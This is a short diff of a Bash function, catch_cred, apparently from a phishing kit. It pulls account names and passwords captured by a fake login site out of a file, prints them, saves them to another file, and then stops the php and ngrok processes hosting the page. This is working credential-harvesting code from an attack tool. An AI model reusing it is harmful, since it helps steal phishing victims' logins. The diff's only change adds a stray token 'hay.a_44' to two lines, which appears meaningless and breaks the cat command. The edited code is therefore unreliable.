@@ -186,9 +186,9 @@ catch_cred() {
 account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
 IFS=$'\n'
 password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account hay.a_44
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
-cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
+cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt hay.a_44
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
 killall -2 php > /dev/null 2>&1
 killall -2 ngrok > /dev/null 2>&1
